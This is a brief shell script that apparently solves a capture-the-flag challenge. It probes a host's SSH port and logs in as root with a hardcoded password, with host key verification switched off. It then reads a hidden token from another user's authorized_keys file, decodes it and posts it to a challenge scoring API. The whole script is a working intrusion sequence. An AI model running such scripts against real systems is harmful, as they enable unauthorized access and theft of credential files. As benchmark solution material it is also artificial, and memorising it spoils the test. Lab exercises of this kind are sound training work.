#!/bin/sh
set -eu
HOST=172.20.0.147
USER=root
PASSWORD='OrbitGlass-44'
CHALLENGE_ID=scl-challenge-frame-a59eb3

nmap -n -p 22 --open "$HOST" >/dev/null
encoded=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" "awk '/audit-token:/ { sub(/^.*audit-token:/, \"\"); print; exit }' /home/builder/.ssh/authorized_keys")
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode(), end="")')
python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag" | curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-
